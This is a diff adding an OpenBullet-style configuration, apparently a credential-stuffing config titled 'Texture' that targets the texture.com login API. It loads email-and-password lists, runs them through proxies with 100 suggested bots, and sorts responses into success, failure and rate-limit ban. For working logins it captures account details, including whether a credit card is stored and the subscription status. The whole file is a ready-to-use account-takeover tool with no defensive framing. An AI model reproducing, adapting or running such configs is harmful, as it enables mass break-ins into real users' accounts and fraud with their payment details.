@@ -1,0 +1,55 @@
+[SETTINGS]
+{
+  "Name": "Texture",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-16T00:32:02.3962268+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://www.texture.com" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "upgrade-insecure-requests: 1" 
+REQUEST POST "https://www.texture.com/accounts/api/login/texture" AutoRedirect=FALSE 
+  CONTENT "j_username=<USER>&j_password=<PASS>&captcha=&needAuthToken=false&nc=nextissue-1.0&sc=NIM" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Accept: text/plain, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "referer: https://www.texture.com/storefront/auth/" 
+  HEADER "origin: https://www.texture.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "AUTHENTICATION_FAILURE" 
+  KEYCHAIN Ban OR 
+    KEY "FLOODED_REQUEST" 
+  KEYCHAIN Success OR 
+    KEY "Successful authentication" 
+#PARSE_renew PARSE "<SOURCE>" JSON "restartSubscriptions" Recursive=FALSE -> CAP "restartSubscriptions" "" "" 
+#PARSE_futuresubtype PARSE "<SOURCE>" JSON "futurePurchaseType" Recursive=FALSE -> CAP "futurePurchaseType" "" "" 
+#PARSE_hascc PARSE "<SOURCE>" JSON "hasCC" Recursive=FALSE -> CAP "hasCC" "" "" 
+#PARSE_hasfuturepriv PARSE "<SOURCE>" JSON "hasFuturePrivilege" Recursive=FALSE -> CAP "hasFuturePrivilege" "" "" 
+#PARSE_latestSubscriptionSource PARSE "<SOURCE>" JSON "latestSubscriptionSource" Recursive=FALSE -> CAP "latestSubscriptionSource" "" "" 
+#PARSE_suspendedStatus PARSE "<SOURCE>" JSON "suspendedStatus" Recursive=FALSE -> CAP "suspendedStatus" "" "" 
+PARSE "<SOURCE>" JSON "unlimitedStatus" Recursive=FALSE -> CAP "unlimitedStatus" "" "" 
